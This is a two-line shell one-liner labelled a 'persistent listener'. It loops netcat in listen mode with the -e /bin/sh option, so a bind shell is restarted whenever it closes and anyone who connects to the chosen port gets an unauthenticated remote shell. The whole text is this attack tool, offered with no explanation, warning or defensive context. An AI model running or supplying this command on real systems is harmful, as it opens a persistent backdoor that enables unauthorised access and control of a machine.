#persistent listener 1 liner
while [ 1 ]; do echo "Listener started"; nc -l -p <port> -e /bin/sh; done
